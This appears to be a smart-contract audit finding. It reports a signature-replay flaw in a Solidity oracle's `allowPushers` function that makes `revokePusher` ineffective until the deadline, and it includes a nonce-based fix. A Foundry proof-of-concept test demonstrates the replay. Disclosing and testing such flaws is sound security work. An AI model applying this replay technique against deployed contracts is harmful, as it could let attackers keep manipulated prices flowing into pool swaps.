### Title
`revokePusher` is ineffective within the deadline window due to missing nonce in `allowPushers` signature — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers` signs pusher consent over `(chainid, oracle, deadline, pusher, creator)` with no nonce and no consumed-flag. A creator who holds a valid, unexpired pusher signature can call `allowPushers` an unlimited number of times with the same signature. This makes `revokePusher` completely ineffective for any pusher whose consent deadline has not yet elapsed: the creator can atomically re-establish the delegation in the same block the pusher revokes it.

### Finding Description

`allowPushers` constructs the EIP-191 digest as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce, no per-signature consumed mapping, and no on-chain record that the signature was ever used. The only replay barrier is `_ensureDeadline`, which only checks `block.timestamp <= deadline`. [2](#0-1) 

`revokePusher` clears `namespaceRemapping[msg.sender]` to `address(0)`:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

Because the signature is not invalidated on first use, the creator can immediately call `allowPushers` again with the identical `(deadline, pusher, signature)` tuple and restore `namespaceRemapping[pusher] = creator`. The revocation is silently undone.

The code's own NatSpec comment acknowledges the risk but incorrectly concludes the deadline is sufficient:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [4](#0-3) 

The deadline limits the *window* of replay but does not prevent replay *within* that window. A pusher who signed with a 30-day deadline cannot revoke for 30 days regardless of intent.

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

So every push the pusher makes after the creator replays the signature continues to land in the creator's namespace, not the pusher's own.

### Impact Explanation

The direct impact is **bad-price execution reaching a pool swap**. The concrete path:

1. A pusher's EOA key is compromised. The attacker begins pushing manipulated prices via the fallback path.
2. The legitimate pusher calls `revokePusher` to redirect future pushes away from the creator's namespace (and thus away from any pool reading that namespace).
3. The creator (or the attacker, if they also control the creator key) calls `allowPushers` with the original, still-valid signature in the same block.
4. `namespaceRemapping[pusher]` is restored to `creator`. The attacker's manipulated pushes continue to land in the creator's namespace.
5. `AnchoredPriceProvider` / `PriceProvider` reads the creator's namespace via `getOracleData` → `_price` → `getBidAndAskPrice`, and the manipulated bid/ask reaches the pool's `swap` call. [6](#0-5) 

Even without key compromise, a pusher who discovers the creator is routing their prices to a malicious pool cannot stop it by revoking — the creator can keep the delegation alive for the full deadline duration.

### Likelihood Explanation

- `allowPushers` is a public, permissionless function callable by any address.
- The only input required is the original `(deadline, pushers[], signatures[])` tuple, which the creator already holds from the initial delegation setup.
- No special privileges, no additional signatures, and no on-chain state change is needed beyond what the creator already possesses.
- Pushers routinely sign with multi-day or multi-week deadlines (the test suite uses `block.timestamp + 1 days`), giving a wide replay window. [7](#0-6) 

### Recommendation

Mark each `(pusher, creator, deadline)` tuple as consumed on first use with a `mapping(bytes32 => bool) usedConsents` keyed on the digest, and revert if the digest has already been used:

```solidity
mapping(bytes32 => bool) private _usedConsents;

// inside allowPushers loop:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!_usedConsents[hash], ConsentAlreadyUsed());
require(pusher == ECDSA.recover(hash, signatures[i]));
_usedConsents[hash] = true;
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, include a per-pusher nonce in the signed payload and increment it on each successful `allowPushers` call, so any previously issued signature is immediately invalidated.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "src/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayRevokePoCTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant CREATOR_KEY = 0xC0FFEE01;
    uint256 constant PUSHER_KEY  = 0xDEADBEEF;

    address creator;
    address pusher;

    function setUp() public {
        vm.warp(1_700_000_000);
        oracle  = new CompressedOracleV1(address(this), 0);
        creator = vm.addr(CREATOR_KEY);
        pusher  = vm.addr(PUSHER_KEY);
    }

    function testRevokeIsIneffectiveWithinDeadline() public {
        uint256 deadline = block.timestamp + 1 days;

        // Pusher signs consent for creator
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Step 1: creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation set");

        // Step 2: pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // Step 3: creator replays the SAME signature — no revert
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);

        // Revocation was silently undone
        assertEq(oracle.namespaceRemapping(pusher), creator,
            "FAIL: revocation undone by signature replay");
    }
}
```
